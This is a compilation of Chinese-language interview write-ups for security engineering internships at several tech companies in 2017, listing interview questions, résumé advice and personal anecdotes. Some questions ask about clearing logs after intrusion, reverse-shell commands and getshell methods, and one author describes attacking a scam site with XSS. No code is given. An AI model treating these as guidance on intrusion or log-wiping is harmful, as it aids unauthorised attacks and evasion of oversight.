class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"> 一面：</span><br><span class="line"> 可能我简历写的比较少，面试官似乎有些不知道问什么，尴尬了一会儿，开头自我介绍，先问了个简单的n!，然后说如果输入的n是负数呢？</span><br><span class="line"> 之后是一道数组最大连续子数组和。</span><br><span class="line"> python基础类库，requests,re，爬虫的基本流程</span><br><span class="line"> 一些基本的sql语句</span><br><span class="line"> </span><br><span class="line"> 二面：</span><br><span class="line"> xss与sql注入的基本原理与分类</span><br><span class="line"> xss如何防御？（分前端与后端，后端需要在入口和出口都过滤）</span><br><span class="line"> app客户端与服务器通信可能出现哪些漏洞问题</span><br><span class="line"> 如何防御中间人攻击？</span><br><span class="line"> https的建立过程</span><br><span class="line"> TCP三次握手的过程以及对应的状态转换</span><br><span class="line"> app客户端破解的大致流程，app解包后文件夹的基本结构</span><br><span class="line"> 对称加密与非对称加密的不同，分别用在哪些方面</span><br><span class="line"> DDOS的攻击，说道syn洪流的原理</span><br><span class="line"> ddos的防御</span><br><span class="line"> 滴滴客户端可能存在哪些逻辑漏洞</span><br><span class="line"> </span><br><span class="line"> 三面：</span><br><span class="line"> 三面面试官感觉比较和蔼，上来先问平时干什么，我说玩游戏，然后说到lol，问我啥段位，我说白银。然后问我为什么段位低，我说一般打得少，基本都是开黑打匹配。</span><br><span class="line"> 然后问了一些其他的生活问题。</span><br><span class="line"> 后来看我简历上写了关于操作系统的，于是问我操作系统各个设备模块间的关系。当时有点蒙，就和他说了下操作系统启动的大致流程，从保护模式开启开始讲，因为实模式阶段记得不是很清楚。因为没想到三面会问我技术，后来想了想，问的意思可能是说设备栈之间数据流从上到下一层层处理的过程。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">date: 2017-05-03</span><br><span class="line">author: 彦修</span><br><span class="line">company: 阿里</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"># 2017春招华为面经</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本来不打算写了的，群里一个同学问我要相关的面试经验，想想自己也是从网上诸多的面试经验中获益，所以就答应他今天抽时间写写，怎么讲呢，一面之后其实就已经不怎么紧张了。总结昨天的经历。</span><br><span class="line"></span><br><span class="line">言归正传，短信说的是10点45的面试短信，地点是高速开元酒店。  </span><br><span class="line">自己九点半出的门，想着要找地方，而且毕竟周末，万一遇到堵车耽误了时间不好，所以有的时候还是建议大家早点过去。因为有的时候，你前边要面试的人没去直接就到你了。  </span><br><span class="line">到了之后时间还早，才十点，遇到同学就跟她一块聊了会。华为提供水、点心什么的。所以大家不用自己买水的，这一点华为考虑的很好，好感加分啊。</span><br><span class="line"></span><br><span class="line">## 0x01 插曲</span><br><span class="line"></span><br><span class="line">首先说自己其中有个小插曲，去之前学长们让问下可不可以霸面，因为之前他在百度和美团实习，没有参加华为机试。当时正好有个华为的工作人员在候选厅里边走动。现在歪个题，讲下华为面试分布情况。首先是两个等候区，一个是一面，一个是二面，而且有两个厅，一个是一面厅，一个是二面厅，两个等候区正好正对着对应面试的门口，所以坐在对应的等候区就好了。到时候会有专门的hr助理喊名字。回到刚才的问题上，正好我就问工作人员霸面的事情，他说帮我问下，然后就走了，等了好久我以为不回来了，过了好久工作人员过来告诉我不好意思，不可以霸面。然后就开始问我你是什么岗位，我说安全工程师，他就跟我握手，翻了下胸牌，告诉我他名字，在这里就不说了。看了下我简历，然后问我有没有什么渗透经历，我就跟他说我前几天利用xss攻击了一个诈骗网站，他听了很开心，然后又看了下简历，问我对工作地点有没有要求啊，我说没有，他说深圳也可以？我说可以。他又问那官网首选城市是哪里，我说杭州。我然后解释说如果可以选我会选择杭州和上海，如果不可以选，哪里都可以。离家里近啊？我说是的。他说挺好，之后又想问什么，但是hr助理喊我去一轮面试，只好走了。其实现在想想那个应该是个大boss，多聊一会，估计面试都省了，哈哈哈。(后来有天晚上接到华为总部电话，但是没接到。额，。。估计。。。)</span><br><span class="line"></span><br><span class="line">## 0x02 技术面</span><br><span class="line"></span><br><span class="line">助理带我到一面面试官面前，一面是在那种大厅里，每个面试官一张桌子，两把椅子。我就直接坐过去，递上简历。面试官扫了一眼，然后简历扔在一边。让我先自我介绍，自我介绍在进去之前自己模拟了好几遍，本来想说自己估计是学校本科之中唯一一个报安全岗位的，只是昨晚才知道除我之外还有一个我们班的，于是就说了自己从大一开始确定做一名安全工程师神马的。然后开始直接提问，问我对称加密算法有哪些，学过密码学基本上都知道几个吧，我说des、aes和rc5，他说非对称呢，我说RSA，他让我描述rsa加密过程，之后我就回复他RSA基础是大素数难分解。再讲了几句，做这个差不多一年前了，具体都忘记了，他说没关系我们下一个，问我摘要算法，我说md5什么的，他说md5已经不安全了，我说知道，目前确实不安全。他说你听过%￥#@。他语速很快，不过即使慢了我好像也不知道是什么，直接说没有听说过。他说没关系下一个，问我具体做什么，我回web安全，像xss、csrf、sql、文件上传、文件解析什么的。他说终端安全呢，我说只是了解没有深入学习。面试官拿出来他手机好像回了条短信。然后跟我说手机安全很重要啊，这里边可是绑定我银行卡的，我说确实不了解。然后问我你们系多少人，我说48，你排名呢，我说20左右，50%了，我说差不多。哪里考的不好啊？我说偏硬件。他说你可以好好学习，不要觉得项目多了那些都不重要。之后他挑出简历一个项目问我，你这软件是什么架构，给我画下，我的回答就具体不说了太长，在这个回答的过程中，面试官主要是在找漏洞。另外就是我简历写了熊猫烧香之后就问我熊猫烧香的感染机制和传播机制。感觉回答的不是很好。面试官也不是很满意。之后让我手写一个压缩算法，主要原因可能是自己当时因为机试时候的代码相似度太高被挂了，之后自己找人跟hr说才起死回生。所以算是检验下，本以为会很难，没想到还是很简单的，就是aabbbbccd，编码成为2a3b2cd，这个不难，问是否可以伪代码，面试官说不要太伪代码就好，我就开始写了，期间问我第三道题没有做出来回去之后有没有再看，我说回去之后又做了一遍，在博客写了，我拿手机给他看，他说不用我这电脑可以上外网。然后看了我博客，发现有百度总结，问我你还有百度面试，结果怎么样，我说三面之后等通知，他说如果华为和百度要你，你去哪里，我说华为，他笑了说，百度这么问，你是不是说百度，我说不是啊，之前以为百度在上海也可以，但是没有，所以我就不想去了。他就打开我博客看我的华为笔试总结题目。我继续写代码，期间还一边问我题目，我回答的时候就看着他，他说不用看直接写就行，可是他问我，我还是不自觉看他，面试官干脆不问了。看我的博客。我差不多代码写完了他指着第三题代码说这个其实可以复用，我说是的啊。然后我说代码好了，然后让我指着代码跟他说。最后时间差不多了，问我有什么想问的。我就问我的优势和劣势。他回答了一些。大意是说我的总结能力很强，不会的问题私下里还会解决，而且比较专一，但是也是劣势，因为不知道硬件，只知道软件。然后说完了之后说出去等二面通知吧！</span><br><span class="line"></span><br><span class="line">## 0x02 综合面</span><br><span class="line"></span><br><span class="line">　　这个面试总体来说没什么可以说的，聊人生，谈理想，说家庭。不过中间让我任意选一个项目经历用英文描述出来，但是觉得也还好。说了将近半小时吧。最后的时候问我有木有问题，我说offer什么时候有通知，他说你希望多久，我说一周吧。他说一周肯定不可能，至少一个月，然后讲了下流程。我说如果有确定的情况我肯定可以等，给我一些正反馈，他说我一直在给你正反馈啊，聊了这么久，你应该能感觉出来，我这边没什么问题的。但是我不能保证百分之百。我说我能理解，然后就出去了。之后秘书告诉我说，一周给结果，我也具体不知道怎么回事。因为我同学说的也是一周给结果。这个结果应该是通知，不是offer吧。不过我感觉意思是一样的。最后说下面试官吧，面试官人很好。思维很敏捷啊。随便一个点就能抽出来一个问题。真是厉害。</span><br><span class="line"></span><br><span class="line">## 0x03 总结</span><br><span class="line"></span><br><span class="line">　　总体这次来说，收到正反馈的时候心里很开心，也开始比较淡定了。工作人员也很好，至于薪资，当时二面问我为什么跟他提这个，我说华为不会亏待每一个人啊。最后给应聘的人说个小建议：“如果真的想去华为，去之前查下华为企业文化什么的挺重要”。当然也不止是华为，你想去的每一个公司都是。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ap注: 彦修师傅最后去了鹅厂</span><br><span class="line"></span><br><span class="line"># 蘑菇街</span><br><span class="line"></span><br><span class="line">- 介绍一个自己提交乌云或补天的漏洞（我提交的都比较 low 啊。。。好尴尬）</span><br><span class="line">- CSRF 成因及防御措施；如果不用 token 如何做防御？</span><br><span class="line">- SSRF 成因，如何深入利用，防御措施；</span><br><span class="line">- 介绍常用的 Python 的库；</span><br><span class="line">- 使用过哪些不太常见的python内置库</span><br><span class="line">- 介绍一下 Python 中的迭代器、生成器、装饰器</span><br><span class="line">- Linux 中让命令在后台运行的方法有哪些？</span><br><span class="line"></span><br><span class="line">## 笔试</span><br><span class="line"></span><br><span class="line">- 从一个文件中读取 100 到 200 行，并发送到一个 URL 上。（面试官没带电脑，我简单说了一下，他又问了中间可能出现哪些异常，怎么处理）</span><br><span class="line"></span><br><span class="line">## 二面</span><br><span class="line"></span><br><span class="line">二面三部分</span><br><span class="line"></span><br><span class="line">1. 综合性问题</span><br><span class="line">    - 你大学做过最有成就感的事情是什么</span><br><span class="line">    - 问我们专业（信息安全和法学双学位）感觉像是你们专业设立的意义是什么</span><br><span class="line">  </span><br><span class="line">2. 技术性问题</span><br><span class="line">    - 说到算法，他问了快速排序</span><br><span class="line">    - 说到C++，他问了cpp的并发（CPP是如何解决多线程竞争资源的</span><br><span class="line">    - 说到恶意代码，他问了：你对逆向有什么理解</span><br><span class="line">    - 我说了项目（类似入侵检测系统），他说</span><br><span class="line">        - 你们的威胁情报肯定不够新..怎么办</span><br><span class="line">        - 你们的数据量太小了怎么办</span><br><span class="line">        - 如何处理误报</span><br><span class="line"></span><br><span class="line">3. 提问</span><br><span class="line"></span><br><span class="line">随便问吧--回答的还是很认真的</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">And--蘑菇街会约面试时间，而且管是小姐姐还是小哥哥说话都很温柔 +加分</span><br><span class="line"></span><br><span class="line">-----其他的都忘了，大概半小时  And 半小时以后收到了邮件 not pass</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: 2017实习经历</span><br><span class="line">date: 2017-04-30 10:54:11</span><br><span class="line">tags:</span><br><span class="line">---</span><br><span class="line">#### 前言</span><br><span class="line"></span><br><span class="line">&gt;之前群里有人说将找实习的经历整理一下对其他人有帮助，我就写一下自己的经历吧，因为隔的时间比较久，有些记不太清楚了，就随便记一下。</span><br><span class="line"></span><br><span class="line">从开学的时候，就开始准备简历了，那时候写了一份给学长，让他帮忙内推一下腾讯,学长帮忙看了一下，觉得写得太乱了，给我一份其他人的改一下，其中还得感谢一下车车帮忙参详。</span><br><span class="line"></span><br><span class="line">简历：</span><br><span class="line"> * 1.简洁，不要太啰嗦，尽量简明易懂。</span><br><span class="line"> * 2.突出重点，奖拿多的可以摆在比较显眼的位置（虽然我很少遇到问这些的面试官）</span><br><span class="line"> * 3.尽量将项目的过程写详细，这也是面试官最关注的地方，其他的地方面试官应该关注得少</span><br><span class="line"></span><br><span class="line">#### 面试</span><br><span class="line"></span><br><span class="line">总的来说，我一共面了六家。（时间顺序）</span><br><span class="line">阿里、科大讯飞、知道创宇、同花顺、360、京东、腾讯</span><br><span class="line">除了360，其他都到HR了，对360表示吐槽。。（战线拉太长了，虽然没有阿里长）😂</span><br><span class="line"></span><br><span class="line">首先收到的是阿里的内推面试电话，阿里的面试官都挺nice的，三天三面很效率。问的都是一些常见的漏洞原理和防御方法，二三面会有提高到具体的一些操作，和一些安全开发的内容，准备充分还是可以过的，就是开始的时候紧张得不行😖，说多了就好了。不过阿里因为蚂蚁安全不招人了，所以简历转到了菜鸟那边，中途隔了40多天才接到HR电话，我以为我早挂了，这一波要给阿里刷一波666，老铁扎心了👍。</span><br><span class="line"></span><br><span class="line">科大、创宇、同花顺都是在安全课和i春秋论坛上看到的，最后都是因为实习期太长的原因没去，但都还行，都只有一面技术面，锻炼一下自己，同花顺还出了个面试题，要写渗透测试报告，挺有心的😅。</span><br><span class="line"></span><br><span class="line">360是我准备的最充分的一次面试吧，然后就挂了，我的天。。。其中还要准备十佳学子，感觉整个人都不好了，今年360跟腾讯不一样，把所有的流程都压缩，一面完后就二面，boss面、HR，不像腾讯是把所有人都面完再开始筛选。所以对后面的人不太公平，通知我的是11：20视频面，到我面试时都快1点了，感觉面试官都累得不行，不过人还是很好的，很有耐心，讲了一些我的不足，对提高水平很有帮助，对我印象也是挺好的。接到一面挂了的电话，还是有些懵逼的。</span><br><span class="line"></span><br><span class="line">能拿到京东的offer也是感觉有些离奇，一面答得挺好的，问了些ssrf和redis未授权访问的知识，还有一些linux的知识。二面就砸了，这里千万提醒各位，面试要找一个安静的地方，不然思路很容易被打断，状态差起来神都帮不了你。可能是一面面试官对我评价较高吧，二面居然也过了，😂。</span><br><span class="line">最后是HR，有问到你是否接到其他公司的面试和进度，你在这几家公司的优先选择是？那时我是说阿里和腾讯都到HR了，优先腾讯京东阿里，但这里提醒一下，如果你不能确定你的HR是否会因为这，pass掉你，你还是说没有吧，毕竟公司也要考虑给你发了offer，你不来会浪费人力资源的。</span><br><span class="line"></span><br><span class="line">最后是我大鹅厂了，因为在本地面试，所以每次都要打车去（前后几百块，心疼🤧），因为之前听学长说不太清楚今年招web不，所以并不抱希望，过程倒是挺顺利的，主要是问的学习经历、项目、奖项，但具体技术问得很少，结尾问一下评价，听他说我谈吐不错、条理清晰的时候，感觉我只剩这些了，要挂。。问了一下工作人员说当天出结果，当晚等到九点多还没来，心想果然挂了，泄气睡觉，隔了一天，突然收到下午去参加二面的消息，感觉有点懵，果断旷课面试去，问的跟一面差不多，同样的套路，自我介绍、学习经历、项目经验。当天晚上，正躺床玩手机呢，就收到二面过了的通知了，激动。赶紧问了一下学长腾讯HR会问的内容，他们说腾讯HR很少刷人，就松了口气，第二天，下雨，打的过去，人已经少了很多，就十几个人。很快到我了，面试官让我放轻松，主要聊了些职业规划、兴趣爱好、部门职责等，然后过了一周就收到offer了。（等的过程真痛苦，京东offer来了之后好些，还是很痛苦）</span><br><span class="line"></span><br><span class="line">#### 面试技巧</span><br><span class="line"></span><br><span class="line">&gt;首先，面试的节奏最好把握在自己手里，我们不可能每个方面都会，让面试官随便问的话，很大概率要挂。可以在自我介绍的时候，将你的学习历程讲清楚，让面试官知道你会什么，接触过什么，让他知道你大概会的东西的方向。其次，基础要扎实，漏洞的原理、种类、防御方式、应用等都应该十分熟悉，而且最好准备一些比较深的内容，开始的时候不说，等他问了再说，效果更好。然后，就是项目的经验了，这种东西要你确实做过且了解很深的才行，不然很容易给面试官留下差印象。还有就是HR，技术面你可以和面试官扯蛋、闲聊、开些玩笑也无所谓，但HR最好就不要了，正经点，别什么真话都往外说，别给他理由把你pass了，内容大概是这样了。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">date: 2017-05-03</span><br><span class="line">author: 头狼(QQ 643382419)</span><br><span class="line">company: 腾讯, 阿里, 其他</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">请移步 http://note.youdao.com/share/?id=b5ce2eea1d669a63daea441fe105e666  </span><br><span class="line">请移步 http://note.youdao.com/share/?id=b5ce2eea1d669a63daea441fe105e666  </span><br><span class="line">请移步 http://note.youdao.com/share/?id=b5ce2eea1d669a63daea441fe105e666</span><br><span class="line"></span><br><span class="line">以下仅为防止对方站无法访问留下的备份, 请访问上面的原文链接  </span><br><span class="line">以下仅为防止对方站无法访问留下的备份, 请访问上面的原文链接  </span><br><span class="line">以下仅为防止对方站无法访问留下的备份, 请访问上面的原文链接</span><br><span class="line"></span><br><span class="line"># 面经 **by头狼**</span><br><span class="line"></span><br><span class="line">　　一个来月的实习求职，有时候忙着修改简历、准备面试，有时候发呆、思考人生，有时候心情复杂看看剧，也要上课学习……总算基本告一段落。挺不错的一个月，又是一段有意思的时光，总需要留下点什么，就来写写吧~  </span><br><span class="line">　　由于还是有点时间意识的，知道3月份一开始就有大公司要开始内推招聘的了，所以在上个月15回校准备简历，回顾、学习岗位所需要的知识点，刷面经。可能没有意识到内推招聘的人会觉得这求职准备算快，但对于那些从上学期开始，就投简历刷经验的人来说，还太嫩呢。</span><br><span class="line"></span><br><span class="line">## 简历</span><br><span class="line"></span><br><span class="line">　　首先是看了几份大牛师兄的简历，知道整个简历结构的怎么样的，感觉我们这些走技术的整个结构都大致相似；同时对于投IT岗来说，重要的分块是：个人技能、项目（实战）经验、奖项荣誉，腾讯的HR也说主要看这些部分。之后便开始根据岗位要求、个人的技术沉淀、经验，花了挺长时间终于写出了这一份简历，一开始挺自豪的。而如果就这么自信将简历给投出去，那将会是石沉大海……到现在的最终版简历，自己也不知道改了几次，有大改、有小改。先是厚着脸皮将简历丢给有经验的师兄，求指点，还有就是找老铁帮忙找毛病，多次修改后才敢将简历给投出去。一份只能自己看的简历，往往就是会石沉大海的，因为通常会觉得自己辛苦写出来的东西，没有bug、没毛病。不过，有时候还要点缘分，前段时间投YY，结果石沉大海了…… </span><br><span class="line"></span><br><span class="line">## 面试</span><br><span class="line"></span><br><span class="line">　　一开始也是刷别人的面经，基本上刷的都是运维、开发的，没找到跟自己岗位很对口的面经。不过通过不同技术岗位的面试问题，基本可以结合自己的岗位要求，猜测大致会被问及哪一块的知识点，需要补补哪些底子基础，项目经验有哪些会被重点问到。然后便尝试独自描述、解答可能会被问到的问题。几次电话面试下来，觉得除了要刷点别人的面经外，还要着重加强对一个技能、项目的描述，如果自己的能力再强，当向别人展现的时候却表达不出，面试官也可能会觉得是一份假简历；还要就是面试完的自我总结，虽然面试过程不长，但也是个学习的过程，可以知道自己哪些描述的不好，还有哪些自己欠缺的知识点，跟这个岗位的大佬有多大的差距……下边分享连续面阿里、腾讯那天晚上冲忙码出的总结吧，由于是自言自语，且那时候赶着早点回宿舍，看起来有点怪，就当作是一个傻逼跟一个傻逼的对话吧╮(╯▽╰)╭</span><br><span class="line"></span><br><span class="line">## 三个小时面了3个电面(2017/03/07)</span><br><span class="line"></span><br><span class="line">　　上周投完简历之后，一直期盼着发短信邮箱通知啊，打电话来啊，给个面试机会啊。会不会已经在简历评估时就已经被刷了啊，自己的简历还有哪些写的不好的，还有哪些要赶紧完善的……  </span><br><span class="line">　　这下好了，都打来了，3小时就要面你3次，一次满足你！哥，我亚历山大啊！在这短短的三个钟里，在这短短的三个电面里，在这短短的一个半钟面试里，感觉到经历了好多，学习到好多，回顾了好多，思考了好多，展现自己好多，被大佬虐的好多……  </span><br><span class="line">　　17：19的时候，一个杭州的电话打了过来，心想：阿里？！自己在官网上的求职状态还在简历评估阶段啊，不过好像实习群上有不少人是处于简历评估时被面试的。接了电话，真是阿里的！有点小兴奋，小激动，也有点小抖，不过有之前腾讯的第一次电面，已经可以适应大公司的电面了。不需要自我介绍，说了两句便开始面试，大致经过如下：  </span><br><span class="line">　　说一下自己在Android逆向的一个学习过程？  </span><br><span class="line">　　讲讲so注入的实现原理？  </span><br><span class="line">　　dex/so的文件格式？  </span><br><span class="line">　　你所说到的注入原理可以通过什么方式来察觉到呢？  </span><br><span class="line">　　如果通过ptrace来检查tracePID以察觉进程是否被注入，还有没有其他的注入方式来实现注入呢？  </span><br><span class="line">　　说一下Linux下ptrace()方法来跟踪进程的实现原理？  </span><br><span class="line">　　fork()的实现，使用？  </span><br><span class="line">　　你对一个程序在Android上被启动的过程了解吗？说一下涉及到哪些进程？  </span><br><span class="line">　　你使用过gdb进行动态调试吗？能说一下它的实现原理吗？  </span><br><span class="line">　　在Android开发、Android系统启动、Android系统漏洞挖掘等方面，你平时比较了解哪个，讲述一下？  </span><br><span class="line">　　好了，对于你自己接下来的学习打算，主要还想学习Android安全的哪些，说说你身边还有哪些书籍，计划学习哪些书籍？</span><br><span class="line"></span><br><span class="line">　　整个过程还是问了好多问题的，但由于连续面了3个，有些一直想不起来。总的感觉就是半跪吧，除了面试官问到比较偏向自己简历写的技能可以比较顺利、自信的答上外，像被问到相对Linux底层的知识时，基本上都是硬着头皮答的，也不知道对不对，有些也因为完全不知道尴尬的过了。勉勉强强吧，最后在反问面试官的时，幸好抓住机会，仍是先关心一下，对于实习生的培训机制。然后问问面试官自己在这次面试中自己有些不足。我便说了自己发现在被问到比较底层的原理时，总是答不上，能不能给我一些接下来学习的建议？可以看哪些书籍可以补一补像Linux下ptrace、fork这些底层知识？面试官很好的跟我指点了一下，像ptrace、fork这些可以在像《Unix环境高级编程》上学习到，对于你想在接下来学习dex的启动、so的加载过程，那就要多翻翻dvm的源代码以及linker的源代码。同时面试官也很有心的提醒到，我现在所掌握的逆向实战，很多是来逆向分析、利用、破解别人的程序，很多都是基于别人的工具进行二次开发，虽然这像大多数人学习安全一样，通过玩玩一下工具使用，逆向利用别人的程序，这样的学习出发点是正确的，但要慢慢开始接触更为底层的知识，像学习Android一些在dex/so加载过程的源代码，学习Linux的开发，学了这些之后，对于像so注入，hook啊之类的问题，你都会发现很简单，同时也通过学习底层的知识，可以像在企业上参与开发一下安全产品出来，这才是更为重要的。</span><br><span class="line"></span><br><span class="line">　　吃完饭，19:14电话再次响起，腾讯总部！太好了，我过了腾讯一面了！好好对待，拿下二面！这个面试官很好，也是我面这几次来面的最好的一次了。主要这次的面试官问我的问题基本都是在更为契合我的简历的，主要的问题有：  </span><br><span class="line">　　讲述一下你是怎么走上学习Android逆向上来的？  </span><br><span class="line">　　说一说你做过哪些逆向分析的实操？  </span><br><span class="line">　　说说你拿到一个Android程序，你是怎么对它进行分析的？以你简历里边写的木马分析为例吧  </span><br><span class="line">　　你接触了哪些so注入的工具？说说实现的原理  </span><br><span class="line">　　你说ptrace在反调试里边也有用到，那你说说是怎样一个原理实现？  </span><br><span class="line">　　你了解GOT hook以及Inline hook，说说Inline hook的实现原理？  </span><br><span class="line">　　Inline hook实现的跳转两条指令是什么？为什么第一条要用LDR而不用MOV？  </span><br><span class="line">　　怎么将第二条指令里存放的hook函数跳转地址，通过LDR付给PC？  </span><br><span class="line">　　你说你对ARM汇编有一定的了解，说说B、BL、BLX指令的使用？  </span><br><span class="line">　　你玩过哪些游戏？这些游戏有哪些可以实现游戏外挂的？</span><br><span class="line"></span><br><span class="line">　　其中也问到我不会的，我也记不起具体在问什么？听不懂。有像说说Zygote进程的原理的。不过感觉总体上的问题我都可以答上，也答的挺清晰的。最后又到反问环节，老规矩，了解一下对于实习生的培训机制，以及游戏安全部门的职责，之后再一次问问在涉及比较底层基础时，自己答不上的不足，请教面试官指点一些方法、书籍来学习提升。由于面试官是腾讯游戏安全部门的，便推荐我可以去看看腾讯游戏部门出的一本关于游戏安全的书，查了一下是《游戏安全》。这一次总体感觉还是挺满意的，应该可以通过二面吧，不过接下来要再好好加油，好好反思，好好补补知识点，争取拿下腾讯的offer！</span><br><span class="line"></span><br><span class="line">　　才在老铁群上边水了一会，去上了个厕所刚坐下，电话又响了……上海？！纳尼！这是……，结果是：阿里！卧槽！这也太快了吧？！瞬间有点反应不过来，这次虽接完没多久，但我却写不出被问到的大致问题，因为这次被问的彻底跪了！  </span><br><span class="line">　　先是一个简单的介绍自己背景及技术能力，之后面试官就说，看你的简历，主要是Android逆向的，那就对你比较擅长的逆向直接问吧。一开始听了还接受的，结果问了native层的代码混淆有哪些实现？瞬间就懵了，呆了，什么鬼？硬扯了，说一下通过修改so文件中节区的配置来混淆静态分析。面试官说不对，举了一下像什么给函数添加一些不必要的分支，还有些我听不懂的。。。来实现混淆。你能说说实现方法吗？尴尬，答不出，开始慌了。那这几年再Android系统上更多使用的ART虚拟机，你跟Dalvik虚拟机进行对比，说一下你的理解，知道多少说多少。这时肠子悔青了！之前本来想找机会看的，结果拖着拖着，没看！……之后说你主要比较多使用C++对吧，问static的作用，问public，private，protect的使用及区别，C++基础学的有点久了，勉强答了一下。像x86中传入两个int类型（32位）的参数，应用哪些寄存器来存放？又呆了！那函数返回值一般放在哪个寄存器？你比较熟ARM，其参数传入是怎样的，返回在放在哪个寄存器？这个还比较好答。又问了ARM调用方法时，对于寄存器的压栈保护，调用方法与被调用方法分别对哪些寄存器进行压栈保护？呆了！还有一些底层知识问的我一脸茫然。总之，说起来我都想哭，完全给跪了。最后反问时，对于我想补补自己在被问跪的细节、底子知识，面试官说这么问，就是想考察我的逆向实战经验，自己平时要做更多逆向分析，不断实战，便会在逆向过程逐步积累掌握……</span><br><span class="line"></span><br><span class="line">　　现在来看那天晚上敲下的总结，还是很有意思的 :)  </span><br><span class="line">　　由上边的面试过程可以看出腾讯的要相对阿里的简单，看实习数据是，腾讯要差不多2000实习生，而阿里500左右；但更为主要的原因是，我的简历是被腾讯游戏安全部门拿去的，而我掌握的技能点和他们现在的需求很是契合，如果像是阿里安全部那样被移动安全的面试到，估计就很不好说啦……所以求职也要有点缘分~</span><br><span class="line"></span><br><span class="line">最后  </span><br><span class="line">　　主要是对这段时光的回味，总结，分享。  </span><br><span class="line">　　QQ：643382419</span><br><span class="line"></span><br><span class="line"># 哔哩哔哩电面</span><br><span class="line"></span><br><span class="line">## CTF 相关</span><br><span class="line"></span><br><span class="line">- 简述 CTF 攻防赛的流程和一些技巧；</span><br><span class="line"></span><br><span class="line">## 服务器运维</span><br><span class="line"></span><br><span class="line">- 查看当前端口连接的命令有哪些？`netstat` 和 `ss` 命令的区别和优缺点；</span><br><span class="line">- Linux 服务器的安全运维操作有哪些？如何保护 SSH？</span><br><span class="line">- 入侵 Linux 服务器后需要清除哪些日志？</span><br><span class="line">- 反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？</span><br><span class="line"></span><br><span class="line">## 渗透测试</span><br><span class="line"></span><br><span class="line">- 介绍渗透测试的流程；</span><br><span class="line">- 简要介绍自己常用的扫描器和其实现上的特点；</span><br><span class="line">- 介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？</span><br><span class="line">- 如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？</span><br><span class="line">- 介绍 CSRF 漏洞和常用的防护手段；</span><br><span class="line">- 介绍 SSRF 漏洞，如何深入利用？如何探测非 HTTP 协议？如何防范？</span><br><span class="line"></span><br><span class="line">## 安全运营</span><br><span class="line"></span><br><span class="line">- 如何防范羊毛党（有猫池）？</span><br><span class="line">- 如果 SRC 上报了一个 XSS 漏洞，payload 已经写入页面，但未给出具体位置，如何快速介入？</span><br><span class="line">- 发现一个大范围影响的新漏洞，如何快速排查公司资产？</span><br><span class="line">- 如果你是安全运营的负责人，简要介绍你对安全方面采取的措施；</span><br><span class="line">- 发现了一个漏洞，你报告给开发人员，但是开发人员不愿意修漏洞，如何沟通？（这是个什么奇怪的问题。。。）</span><br><span class="line"></span><br><span class="line">面经部分：  </span><br><span class="line">360(2017.11.18 48Min  offer)  </span><br><span class="line">1.多久开始接触安全的？  </span><br><span class="line">2.熟悉安全方面的哪些内容？web?逆向？IOT?在公司主要的工作内容？  </span><br><span class="line">3.分析下Web框架（Django,Struct 2）出现过的漏洞，原理，分析过程，利用手法 。（因为简历有提）  </span><br><span class="line">4.有没做过安全开发？写过哪些安全工具？namp扫描器原理？  </span><br><span class="line">5.场景分析：360自制扫描器扫出100w个可疑URL，如何写脚本排查sqli误报？如何排查xss误报？（url中存在payload）思路？  </span><br><span class="line">6.黑过哪些网站？说一次最骄傲的Hack经历(从得到域名到getshell)？  </span><br><span class="line">7.如何搜集子域名？getshell有哪些方法？哪种用的最多？提权了解过哪些方法？nc反弹提权原理？一句话木马原理？  </span><br><span class="line">8.内网渗透玩过没？域？  </span><br><span class="line">8.逆向会不会？软件安全了解过没？（没）  </span><br><span class="line">9.想做来做哪个方向？安全开发？安服？安全研究？（我看你目前不行）  </span><br><span class="line"></span><br><span class="line"># 阿里巴巴</span><br><span class="line"></span><br><span class="line">## 阿里春招面试有关的FAQ</span><br><span class="line"></span><br><span class="line">1. 在阿里巴巴春招(实习生)中, 我会被面试几轮? 面试轮数越多越好吗?</span><br><span class="line">    &gt; 技术岗面试流程一般是 技术面+HR面</span><br><span class="line">      偶尔在HR面后还会有技术面</span><br><span class="line"></span><br><span class="line">    &gt; 先看一个图, 是2017年(18届)阿里非官方Offer群里的一个投票.</span><br><span class="line">      ![alibaba-vote](_img/alibaba-vote.png)</span><br><span class="line">      可以发现面试轮数呈正态分布.</span><br><span class="line">      请注意! 这里统计的都是 **拿到阿里offer的同学** 不包括没有拿到阿里offer的.</span><br><span class="line">      按照ap自己不靠谱的小样本, 不转岗走到4面或者更多的基本是稳的.</span><br><span class="line"></span><br><span class="line">    &gt; 一般来说, 评级高的人面试轮数也多. 面试轮数多的评级高的可能性也大。  </span><br><span class="line">      这也是很好理解的，因为你厉害，所以公司在你身上消耗了更多的面试资源。</span><br><span class="line">      一句话, 按经验来说:  面得越多, 你越吊。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2. 什么是阿里的交叉面? 哪些人有交叉面?</span><br><span class="line">    &gt; 交叉面就是跨BU面.  (ps: BU指阿里的事业群, 具体看这里 https://campus.alibaba.com/trems.htm)</span><br><span class="line">      就比如说你投的是淘宝, 然后天猫的人来面试你, 就是交叉面  </span><br><span class="line">      一般来说, 厉害的同学才有交叉面；具体来说, 是评级在A及以上的同学  </span><br><span class="line">      (据说是)为了避免部门内部恶意操纵评级。  </span><br><span class="line">      &lt;此句非常主观&gt; 根据我的观察，交叉面刷人比较少，能走到交叉面，一般都能过。</span><br><span class="line"></span><br><span class="line">    &gt; 有些面试官会主动说这轮是交叉面， 更多时候还是要自己问。</span><br><span class="line">      &lt;此句非常主观&gt; 按道理来说交叉面的面试官不会和自己的部门隔得太远。比如一个安全的, 不会前端的来面你。  </span><br><span class="line">      但也有例外， 有同学遇到过方向完全不一样的交叉面。</span><br><span class="line"></span><br><span 